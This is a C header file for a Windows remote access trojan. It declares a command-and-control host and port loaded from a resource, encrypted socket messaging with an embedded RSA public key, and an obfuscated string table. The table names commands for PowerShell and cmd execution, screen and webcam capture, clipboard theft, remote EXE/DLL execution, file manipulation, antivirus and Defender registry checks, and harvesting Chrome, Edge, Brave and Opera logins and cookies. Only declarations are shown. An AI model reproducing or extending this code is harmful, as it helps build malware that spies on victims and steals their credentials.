#ifndef UTILS_H
#define UTILS_H

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Base64
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length);
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);

// String helpers
char* str_replace(const char* orig, const char* rep, const char* with);
void str_trim(char* s);

// Networking helper
void sock_send(SOCKET sock, HANDLE mutex, const char* msg);
void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg);

// Hybrid Encryption
typedef struct { unsigned char key[32]; unsigned char iv[16]; } SessionKey;
char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem);
char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv);
unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv);

// Time
void get_formatted_time(unsigned long long secs, char* out_buf);

// Config
extern char g_host[256];
extern int g_port;
void load_config_from_resource();

// Polymorphic String Mapping - KSTR_ to avoid collisions
typedef enum {
    KSTR_PING, KSTR_PONG, KSTR_MSG_PRE, KSTR_MSG_TITLE, KSTR_OK, KSTR_EXEC_PS, KSTR_PS_OUT, KSTR_EXEC_CMD, KSTR_CMD_OUT,
    KSTR_SCR_STOP, KSTR_CAM_STOP, KSTR_TASKLIST, KSTR_TASKKILL, KSTR_LS, KSTR_DOWNLOAD, KSTR_DELETE, KSTR_MKDIR,
    KSTR_UPLOAD, KSTR_RENAME, KSTR_RFE_EXE, KSTR_RFE_DLL, KSTR_BROWSER_COL, KSTR_CLIP_GET, KSTR_CLIP_SET,
    KSTR_UNINSTALL, KSTR_CLOSE, KSTR_RECONNECT, KSTR_SET_DELAY, KSTR_SCR_START, KSTR_CAM_START, KSTR_SYSINFO,
    KSTR_RESPONSE, KSTR_COMMAND, KSTR_SESSION, KSTR_REG_WIN_KEY, KSTR_REG_PROD_NAME, KSTR_REG_BUILD,
    KSTR_REG_DISPLAY, KSTR_REG_RELEASE, KSTR_REG_AV_BASE, KSTR_REG_DEFENDER_KEY, KSTR_REG_DIS_SPY,
    KSTR_REG_GPU_KEY, KSTR_REG_GPU_DESC, KSTR_REG_CPU_KEY, KSTR_REG_CPU_NAME, KSTR_HTTP_UA, KSTR_HTTP_HOST,
    KSTR_HTTP_PATH, KSTR_C_DRIVE, KSTR_UNKNOWN, KSTR_WIN_DEF, KSTR_COUNTRY_NA, KSTR_LS_RES, KSTR_TASK_RES,
    KSTR_TASK_PID, KSTR_TASK_NAME, KSTR_TASK_CPU, KSTR_TASK_MEM, KSTR_KILL_RES, KSTR_KILL_OK, KSTR_PS_ARGS,
    KSTR_CMD_C, KSTR_SCR_FILE, KSTR_SCR_FRAME, KSTR_CAM_FILE, KSTR_CAM_FRAME, KSTR_CLIP_RES,
    KSTR_CLIP_ERR_OPEN, KSTR_CLIP_ERR_LOCK, KSTR_CLIP_SET_RES, KSTR_CLIP_SET_ERR_OPEN,
    KSTR_CLIP_SET_ERR_ALLOC, KSTR_CLIP_SET_ERR_DATA, KSTR_RFE_RES, KSTR_RFE_ERR_DOWN, KSTR_RFE_ERR_PROC,
    KSTR_RFE_ERR_DLL, KSTR_RFE_EXE_NAME, KSTR_RFE_DLL_NAME, KSTR_RUNDLL, KSTR_BR_CHROME, KSTR_BR_EDGE,
    KSTR_BR_BRAVE, KSTR_BR_OPERA, KSTR_BR_CHROME_PATH, KSTR_BR_EDGE_PATH, KSTR_BR_BRAVE_PATH,
    KSTR_BR_OPERA_PATH, KSTR_BR_CHROME_DLL, KSTR_BR_EDGE_DLL, KSTR_BR_OPERA_DLL, KSTR_BR_LOGIN,
    KSTR_BR_COOKIES, KSTR_BR_WEB, KSTR_BR_NET_COOKIES, KSTR_BR_DEFAULT, KSTR_BR_PROFILE, KSTR_BR_MARKER,
    KSTR_UNINSTALL_CMD, KSTR_FB_ERROR, KSTR_FB_PATH, KSTR_FB_SEP, KSTR_FB_NAME, KSTR_FB_TYPE, KSTR_FB_DRIVE,
    KSTR_FB_SIZE, KSTR_FB_MTIME, KSTR_FB_ITEMS, KSTR_FB_DIR, KSTR_FB_FILE, KSTR_FB_DENIED,
    KSTR_FB_CANNOT_OPEN, KSTR_FB_CANNOT_DEL, KSTR_FB_CANNOT_MKDIR,
    KSTR_COUNT
} StringIndex;

const char* s(StringIndex idx);

#define RSA_PUB_KEY "-----BEGIN PUBLIC KEY-----\n"\
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuYRrLUofWNv/EU3mNLah\n"\
"JQb9i7dbOi35/KGzyYsPd2HcufAa36GvQowUhGQyIWDfXqes7MkTQOE6/oNed1Ri\n"\
"QqNJBI7dexup5W54G4NIzl8BuY34A0jxsrKvZ5ZfYm/hDXMG7i1Qmqz3q7YU4AMH\n"\
"lpIZkfHgcvDNTj5AosN88HRgvfo8M8l8U8+jdCbJa4LSBS7Q0gYwuzUJedm6Cw9Y\n"\
"MgSxi1Dlgy/t6S3M2bPx2EFGQttagPBL8LFT+kGPQSsRpTkniNLOME8Bmk5muQCV\n"\
"JIJDxn9zppu5zYYcDgzQLRPfN+VxoVIby9JapCMQBELyM2KponzjW7TEOKHkjRql\n"\
"9QIDAQAB\n"\
"-----END PUBLIC KEY-----"

#endif
